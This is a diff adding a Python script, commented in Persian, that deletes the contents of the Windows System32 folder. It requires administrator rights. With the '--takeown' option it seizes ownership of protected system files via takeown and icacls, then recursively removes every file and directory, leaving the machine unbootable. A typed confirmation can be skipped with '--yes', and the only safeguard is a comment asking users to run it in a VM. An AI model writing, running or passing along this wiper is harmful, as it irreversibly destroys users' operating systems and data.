@@ -1,0 +1,64 @@
+#!/usr/bin/env python3
+"""sys32_wipe.py — پاک‌کردن محتویات System32. فقط داخل VM / سیستم دورریز اجرا کن."""
+import os, sys, ctypes, shutil, subprocess, time
+
+SYS32 = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32")
+
+def is_admin() -> bool:
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except Exception:
+        return False
+
+def take_ownership():
+    """مالکیت فایل‌های TrustedInstaller (مثل dllهای سیستمی) را می‌گیرد."""
+    subprocess.run(["takeown", "/F", SYS32, "/R", "/A", "/D", "Y"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.run(["icacls", SYS32, "/grant", "Administrators:F", "/T", "/C", "/Q"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+def wipe(force_everything=True):
+    deleted = failed = 0
+    for root, dirs, files in os.walk(SYS32, topdown=False):
+        for f in files:
+            p = os.path.join(root, f)
+            try:
+                try:
+                    os.chmod(p, 0o777)          # پاک‌کردن flaggedهای read-only
+                except OSError:
+                    pass
+                os.remove(p)
+                deleted += 1
+            except OSError:
+                failed += 1                      # DLLهای در حال استفاده
+        if force_everything:
+            for d in dirs:
+                try:
+                    os.rmdir(os.path.join(root, d))
+                except OSError:
+                    pass
+    try:
+        os.rmdir(SYS32)
+    except OSError:
+        pass
+    return deleted, failed
+
+def main():
+    if not is_admin():
+        sys.exit("[!] باید با دسترسی Administrator اجرا شود.")
+    print(f"[*] هدف: {SYS32}")
+    print(f"[*] وجود دارد: {os.path.isdir(SYS32)}")
+    if "--yes" not in sys.argv:
+        if input("برای حذف (غیرقابل بازگشت) بنویس WIPE: ").strip() != "WIPE":
+            sys.exit("[*] لغو شد.")
+    if "--takeown" in sys.argv:
+        print("[*] گرفتن مالکیت فایل‌ها (چند دقیقه طول می‌کشد)...")
+        take_ownership()
+    print("[*] حذف در حال انجام است...")
+    t = time.time()
+    deleted, failed = wipe()
+    print(f"[+] حذف‌شده: {deleted} | ناموفق (in-use): {failed} | زمان: {time.time()-t:.1f}s")
+    print("[!] سیستم‌عامل معمولاً بلافاصله پایدار نمی‌ماند. حالا is/switch off.")
+
+if __name__ == "__main__":
+    main()
